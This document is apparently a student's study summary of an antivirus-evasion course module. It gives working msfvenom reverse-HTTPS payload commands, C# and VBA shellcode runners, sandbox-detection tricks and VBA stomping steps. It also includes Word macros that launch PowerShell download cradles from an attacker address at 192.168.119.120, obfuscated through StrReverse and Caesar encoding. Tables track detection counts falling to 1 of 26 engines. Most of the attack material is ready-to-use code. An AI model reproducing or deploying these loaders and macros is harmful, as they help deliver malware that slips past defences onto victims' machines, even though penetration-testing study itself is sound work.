Introduction to Antivirus Evasion — Full Summary by Section
1. Antivirus Software Overview
Detection types
```
┌─────────────────────────────────────────────────────┐
│  SIGNATURE-BASED DETECTION                          │
│  → MD5/SHA-1 hashes of malicious files              │
│  → Unique byte sequences found in known malware     │
│  → Fast and efficient, but bypassable               │
├─────────────────────────────────────────────────────┤
│  HEURISTIC / BEHAVIORAL DETECTION                   │
│  → Simulates execution inside a sandbox             │
│  → Looks for known malicious behavior patterns      │
│  → Slower and more resource-intensive               │
├─────────────────────────────────────────────────────┤
│  CLOUD-BASED + AI DETECTION                         │
│  → More accurate but expensive                      │
│  → Far less widely implemented than the above       │
└─────────────────────────────────────────────────────┘
```
Products used in this module
ClamAV → free, heuristics disabled for signature testing
Avira Free → free, signature + heuristics
AntiScan.Me → scans against 26 engines without distributing results
VirusTotal → 50+ engines but shares results with AV vendors ← dangerous for ops
3. Locating Signatures in Files
Concept

Split the binary into progressively smaller segments and scan each one until the exact bytes triggering detection are identified.

Tool: Find-AVSignature
```
powershell
# Import the script
Import-Module .\Find-AVSignature.ps1

# STEP 1: Scan the entire file with 10000-byte intervals
Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 `
  -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force

# STEP 2: Detected between 10000-20000, narrow to 1000 bytes
Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 `
  -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force

# STEP 3: Detected between 18000-19000, narrow to 100 bytes
Find-AVSignature -StartByte 18000 -EndByte 19000 -Interval 100 `
  -Path C:\Tools\met.exe -OutPath C:\Tools\avtest3 -Verbose -Force

# STEP 4: Detected between 18800-18900, narrow to 10 bytes
Find-AVSignature -StartByte 18800 -EndByte 18900 -Interval 10 `
  -Path C:\Tools\met.exe -OutPath C:\Tools\avtest4 -Verbose -Force

# STEP 5: Detected between 18860-18870, narrow to 1 byte
Find-AVSignature -StartByte 18860 -EndByte 18870 -Interval 1 `
  -Path C:\Tools\met.exe -OutPath C:\Tools\avtest5 -Verbose -Force
```
Scanning with ClamAV
```
powershell
cd 'C:\Program Files\ClamAV'
.\clamscan.exe C:\Tools\avtest1

# Example output:
# met_0.bin:     OK
# met_10000.bin: OK
# met_20000.bin: Win.Trojan.MSShellcode-7 FOUND  ← signature between 10000-20000
```
Modifying the detected bytes
```
powershell
# Once the exact byte offset is found (e.g., offset 18867):
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[18867] = 0      # zero out the offending byte
$bytes[18987] = 0      # second signature
$bytes[73801] = 0xFF   # last signature (0x00 doesn't work here, 0xFF does)
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```
Results and limitations
✅ Bypasses ClamAV
❌ Avira still detects the modified file
❌ Can break the executable's functionality
❌ Byte offsets change every time the payload is regenerated
❌ Tedious and not scalable in real engagements
3. Bypassing Antivirus with Metasploit
3a. Encoders
List available encoders
```
bash
msfvenom --list encoders
Most famous encoder: shikata_ga_nai (32-bit only)
```
```
bash
# Polymorphic encoder: produces different output every run
sudo msfvenom -p windows/meterpreter/reverse_https \
  LHOST=192.168.119.120 LPORT=443 \
  -e x86/shikata_ga_nai \
  -f exe -o /var/www/html/met.exe
```
Result: ClamAV still detects it because the decoding routine is static and has its own signature.

64-bit payload without encoder
```
bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.119.120 LPORT=443 \
  -f exe -o /var/www/html/met64.exe
ClamAV: OK ✅  (fewer signatures exist for 64-bit)
Avira:  DETECTED ❌
64-bit encoder: zutto_dekiru
```
```
bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.119.120 LPORT=443 \
  -e x64/zutto_dekiru \
  -f exe -o /var/www/html/met64_zutto.exe
```
Result: Avira still detects it — the executable template is static and has its own signature.

Using a custom template (notepad.exe)
```
bash
# Copy notepad.exe from Windows to Kali first
sudo msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.176.134 LPORT=443 \
  -e x64/zutto_dekiru \
  -x /home/kali/notepad.exe \
  -f exe -o /var/www/html/met64_notepad.exe
```
Result: Avira still detects it ❌

3b. Encryptors
List available encryption options
```
bash
msfvenom --list encrypt
# aes256, base64, rc4, xor
AES256
```
```
bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.119.120 LPORT=443 \
  --encrypt aes256 \
  --encrypt-key fdgdgj93jf43uj983uf498f43 \
  -f exe -o /var/www/html/met64_aes.exe
```
Result: Avira still detects it — the decryption routine is static and has its own signature.

Key takeaway from this section
Metasploit encoders and encryptors are no longer effective
because the decoding/decryption routines are STATIC —
vendors have already written signatures for them.
→ The solution is to write custom code.
4. Bypassing Antivirus with Custom C#
4a. Basic C# Shellcode Runner
```
csharp
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Raw Meterpreter shellcode (64-bit, unencoded)
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4... // generated with msfvenom
            };

            int size = buf.Length;

            // 1. Reserve executable memory
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // 2. Copy shellcode into that memory
            Marshal.Copy(buf, 0, addr, size);

            // 3. Execute in a new thread
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            // 4. Wait so the process doesn't exit
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
Results:

Avira:        OK ✅ (signature bypassed)
ClamAV:       OK ✅
AntiScan.Me:  11/26 flagged ⚠️ (heuristics are active)
4b. Encrypting the Shellcode with Caesar Cipher
STEP 1: Create a Helper app to encrypt the shellcode

```
csharp
// "Helper" project — encrypts the shellcode and prints the result
namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0... // original raw shellcode
            };

            byte[] encoded = new byte[buf.Length];

            // Caesar cipher: add 2 to each byte value
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                // & 0xFF keeps the value within the 0-255 byte range
            }

            // Format and print in 0x__, 0x__ hex format
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach(byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
                // 0: = first argument (the byte value)
                // x2 = hexadecimal, minimum 2 digits
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```
STEP 2: Shellcode runner with decryption routine
```
csharp
static void Main(string[] args)
{
    // Encrypted shellcode (output from the Helper app)
    byte[] buf = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2...};

    // Decryption routine: subtract 2 (reverse of the encryption)
    for(int i = 0; i < buf.Length; i++)
    {
        buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
    }

    // ... rest of the shellcode runner unchanged
    IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
    Marshal.Copy(buf, 0, addr, buf.Length);
    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    WaitForSingleObject(hThread, 0xFFFFFFFF);
}
```
Result:

AntiScan.Me: 7/26 flagged ✅ (improved from 11/26)
5. Bypassing Heuristic Detection
5a. Sleep Timer (Emulation Detection via Time)

Concept: The AV emulator fast-forwards through Sleep calls to avoid long wait times. By measuring elapsed time before and after Sleep, we can detect if we are being emulated.
```
csharp
// Import the Sleep API
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);

static void Main(string[] args)
{
    // Record the time before sleeping
    DateTime t1 = DateTime.Now;

    // Sleep for 2 seconds
    Sleep(2000);

    // Calculate elapsed time
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;

    // If less than 1.5 seconds passed → Sleep was fast-forwarded → exit
    if(t2 < 1.5)
    {
        return; // Exit without executing any shellcode
    }

    // If we reach here, we are running for real
    // ... rest of the shellcode runner
}
```
Combined with Caesar cipher:

AntiScan.Me: 6/26 ✅ (improved from 7/26, now bypasses Windows Defender)
5b. Non-Emulated APIs (VirtualAllocExNuma)

Concept: If the AV emulator does not support a specific API, the call will fail and return NULL. We can detect AV emulation by simply checking the return value.

Why VirtualAllocExNuma:

A variant of VirtualAllocEx optimized for multi-CPU NUMA server systems
Many AV products do not emulate it
If the AV emulator runs it → returns NULL → we detect emulation and exit
```
csharp
// DllImport for VirtualAllocExNuma
// (not on pinvoke.net — deduced by comparing with VirtualAllocEx prototype)
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(
    IntPtr hProcess,          // handle to the target process
    IntPtr lpAddress,         // desired address (or null)
    uint dwSize,              // size of allocation
    UInt32 flAllocationType,  // allocation type
    UInt32 flProtect,         // memory protection flags
    UInt32 nndPreferred       // preferred NUMA node (CPU) ← extra argument
);

// DllImport for GetCurrentProcess
// (returns a handle to the currently running process)
[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();

static void Main(string[] args)
{
    // Try to allocate memory using the uncommon NUMA API
    IntPtr mem = VirtualAllocExNuma(
        GetCurrentProcess(),  // current process handle
        IntPtr.Zero,          // let the OS choose the address
        0x1000,               // 4KB
        0x3000,               // MEM_COMMIT | MEM_RESERVE
        0x4,                  // PAGE_READWRITE
        0                     // NUMA node 0 (first CPU)
    );

    // If the API is not emulated → mem will be NULL
    if(mem == null)
    {
        return; // Exit without executing shellcode
    }

    // If we reach here, we are running on a real machine
    // ... rest of the shellcode runner with Caesar cipher
}
```
Combined result (Caesar + VirtualAllocExNuma):

AntiScan.Me: 4/26 ✅ (significant improvement)
C# Progress Table
Technique	Detections
Basic shellcode runner	11/26
+ Caesar cipher	7/26
+ Sleep timer	6/26
+ VirtualAllocExNuma	4/26
6. Antivirus Evasion in VBA (Microsoft Word)
6a. Basic VBA Shellcode Runner
```
vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" _
    (ByVal SecurityAttributes As Long, ByVal StackSize As Long, _
     ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, _
     ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" _
    (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
     ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" _
    (ByVal lDestination As LongPtr, ByRef sSource As Any, _
     ByVal lLength As Long) As LongPtr

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long

    ' Meterpreter shellcode in decimal format
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229 ...)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Copy shellcode byte by byte into allocated memory
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub
```
Result: AntiScan.Me: 7/26

6b. Caesar Cipher in VBA
Encryptor (C# Helper — decimal output format for VBA)
```
csharp
// Modified Helper to output decimal values with line breaks for VBA
uint counter = 0;
StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach(byte b in encoded)
{
    hex.AppendFormat("{0:D}, ", b);  // D = decimal (not hexadecimal)
    counter++;
    if(counter % 50 == 0)
    {
        hex.AppendFormat("_{0}", Environment.NewLine); // VBA line continuation
    }
}
Console.WriteLine("The payload is: " + hex.ToString());
Decryption routine in VBA
vba
' Subtract 2 from each byte (reverse of the encryption)
For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
Next i

Result: AntiScan.Me: 7/26 (no significant improvement)

6c. Sleep Timer in VBA
vba
Private Declare PtrSafe Function Sleep Lib "KERNEL32" _
    (ByVal mili As Long) As Long

' Inside the main function:
Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)  ' "s" = output in seconds

If time < 2 Then
    Exit Function  ' Sleep was fast-forwarded → we are being emulated
End If
```
Result: AntiScan.Me: 7/26 (no improvement — detections are signature-based, not heuristic)

7. VBA Stomping
Core Concept

Inside a Word document there are two versions of the VBA code:

CompressedSourceCode  → human-readable VBA text source
P-code               → pre-compiled binary version of the macro

If opened on the SAME Office version it was created on:
    → P-code executes, source code is IGNORED

If opened on a DIFFERENT Office version:
    → Source code executes, P-code is ignored

The idea: Delete the VBA source code (stomping) while leaving the P-code intact. The macro still runs but the source code is gone — invisible and unscannable.

Process using FlexHEX
1. Open FlexHEX → File > Open > OLE Compound File
2. Navigate to: Macros > VBA > NewMacros
3. Find the text: "Attribute VB_Name = "New Macros""
4. Select from that point all the way to the end of the file
5. Edit > Insert Zero Block → OK (replaces selection with null bytes)
6. Save and close FlexHEX

Optionally — hide the macro from the VBA editor:

1. In FlexHEX, open the PROJECT file
2. Find the line: "Module=NewMacros"
3. Edit > Insert Zero Block (replace with null bytes)
→ The macro disappears from the VBA editor
  but still executes when the document is opened

Result:

The Word document appears empty in the VBA editor
Opening with "Enable Content" → P-code executes → reverse shell ✅
AntiScan.Me: 4/26 ✅ (down from 7/26)

Automating with EvilClippy:

C:\Tools\EvilClippy.exe → automates the entire stomping process
8. PowerShell Download Cradle Hidden Inside VBA
8a. Basic Version (Direct Shell call)

```
vba
Sub MyMacro()
    Dim strArg As String
    strArg = "powershell -exec bypass -nop -c iex((new-object " & _
             "system.net.webclient).downloadstring(" & _
             "'http://192.168.119.120/run.txt'))"
    Shell strArg, vbHide
End Sub
```
Problem: PowerShell is a child process of Word → highly suspicious
Result: AntiScan.Me: 8/26 ← worse than embedding raw shellcode

8b. De-chaining with WMI

Concept: Use WMI to spawn PowerShell as a child of WmiPrvSE.exe instead of Word.
```
vba
Sub MyMacro()
    ' PowerShell will now be a child of WmiPrvSE.exe, NOT Word
    strArg = "powershell -exec bypass -nop -c iex((new-object " & _
             "system.net.webclient).downloadstring(" & _
             "'http://192.168.119.120/run.txt'))"

    ' winmgmts:    → connects to the WMI service
    ' Win32_Process → WMI class for managing processes
    ' Create        → method that creates the new process
    ' Arguments: command, process info (null), (null), output PID
    GetObject("winmgmts:").Get("Win32_Process").Create _
        strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```
Result:

PowerShell runs as child of WmiPrvSE.exe ✅ (de-chained from Word)
AntiScan.Me: 7/26 (no improvement — cradle string still visible in plaintext)
8c. Obfuscation with StrReverse
```
vba
' Wrapper function to minimize appearances of StrReverse
' (StrReverse itself is a known malware indicator)
Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub Mymacro()
    Dim strArg As String

    ' PowerShell download cradle reversed
    strArg = bears("))'txt.nur/021.911.861.291//:ptth'" & _
             "(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei" & _
             " c- pon- ssapyb cexe- llehsrewop")

    ' WMI strings also reversed
    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create _
        strArg, Null, Null, pid
End Sub
```
Result: AntiScan.Me: 4/26 ✅ (down from 7)

8d. Caesar Cipher Encryption in VBA (most advanced technique)
Encryption script in PowerShell
```
powershell
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object " +
           "system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    # Add 17 to the decimal value of each character (Caesar key = 17)
    [string]$thischar = [byte][char]$_ + 17

    # Pad to exactly 3 digits for uniform parsing during decryption
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}

# Copy encrypted output to clipboard
$output | clip

Example output:

129128136118131132121118125125049062118137118116049115138...
(each group of 3 digits = one encrypted character)
Decryption routine in VBA
vba
' Subtract 17 and convert back to a character
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

' Extract the first 3 characters of the encrypted string
Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

' Remove the first 3 characters already processed
Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

' Main decryption loop
' Processes the encrypted string 3 characters at a time
Function Nuts(Milk)
    Do
        ' Take the first 3 chars and decrypt them into one character
        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
        ' Remove the 3 chars just processed
        Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String

    ' PowerShell download cradle encrypted with Caesar (key = 17)
    Apples = "12912813611813113212111812512504906211813711811604911513812911413213204906212712812904906213604912112211711711812704906211604912211813705705712711813606212811512311811613304913213813213311812606312711813306313611811511612512211812713305806311712812813612512812811411713213313112212712005705612113313312907506406406607406706306607107306306606607406306606706506411512812812406313313705605805812113313312907506406406607406706306607107306306606607406306606706506406506606507907907907707607107507407106506706506606807306306606607406306606706506406506607406706306606707307106506606607306506506607406306606706506406906606607006706306606607006606606507106706506606607006606606707106606306706606706306606607406706306606705"

    ' Decrypt the cradle and store in Water
    Water = Nuts(Apples)

    ' WMI connection and class strings also encrypted and decrypted inline
    GetObject(Nuts("136122127126120126133132075")).Get( _
        Nuts("104122127068067112097131128116118132132")).Create _
        Water, Tea, Coffee, Napkin
        ' Tea, Coffee, Napkin are undefined variables → equal to Null
End Function
```
Result: AntiScan.Me: 2/26 ✅

8e. Document Name Verification (Heuristic Bypass)

Concept: When an AV emulator scans a document, it typically renames it. By checking the document’s name at runtime and exiting if it doesn’t match the expected name, we can detect emulation and bail out before executing any malicious code.
```
vba
' "runner.doc" encrypted with Caesar cipher (key = 17)
' = "131134127127118131063117128116"

If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
    Exit Function  ' Name doesn't match → likely being emulated → exit
End If

' IMPORTANT: The saved file must be named exactly "runner.doc"
' otherwise the check fails and the macro exits on the real machine too
```
Final result: AntiScan.Me: 1/26 ✅

Full Progress Table
C# Shellcode Runner
Technique	AntiScan.Me Detections
Basic shellcode runner	11/26
+ Caesar cipher encryption	7/26
+ Sleep timer	6/26
+ VirtualAllocExNuma	4/26
VBA / Microsoft Word
Technique	AntiScan.Me Detections
Basic VBA with raw shellcode	7/26
+ Caesar cipher	7/26
+ Sleep timer	7/26
VBA Stomped	4/26
PowerShell cradle (Shell method)	8/26
+ WMI de-chaining	7/26
+ StrReverse obfuscation	4/26
+ Caesar encryption (key = 17)	2/26
+ Document name verification	1/26
Golden Rules of This Module
1. Public/known code ALWAYS has signatures → write your own
2. Static decryption/decoding routines have their own signatures
3. Custom encryption + heuristic bypass = most effective combination
4. VirusTotal shares results with vendors → use AntiScan.Me instead
5. VBA Stomping only works if the target Office version matches exactly
6. The document filename matters for the name-check heuristic bypass
7. De-chaining PowerShell from Word via WMI reduces process tree suspicion
8. The fewer times a known bad function (like StrReverse) appears, the better
